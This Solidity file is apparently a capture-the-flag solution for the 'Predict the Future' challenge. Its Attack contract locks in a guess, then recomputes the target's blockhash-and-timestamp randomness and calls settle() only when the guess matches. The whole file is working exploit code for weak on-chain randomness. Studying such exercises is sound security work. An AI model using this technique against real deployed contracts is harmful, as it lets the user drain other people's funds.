// SPDX-License-Identifier: MIT
pragma solidity ^0.4.21;

import "./PredictTheFutureChallenge.sol";

contract Attack {
    uint8 public answer;
    PredictTheFutureChallenge private target;

    function Attack(address _address) public {
        target = PredictTheFutureChallenge(_address);
    }

    function lockInGuess() external payable {
        require(msg.value == 1 ether);

        target.lockInGuess.value(1 ether)(5);
    }

    function hack() external payable {
        answer = uint8(keccak256(block.blockhash(block.number - 1), now)) % 10;

        if (answer == 5) {
            target.settle();
        }
    }

    function() public payable {}
}
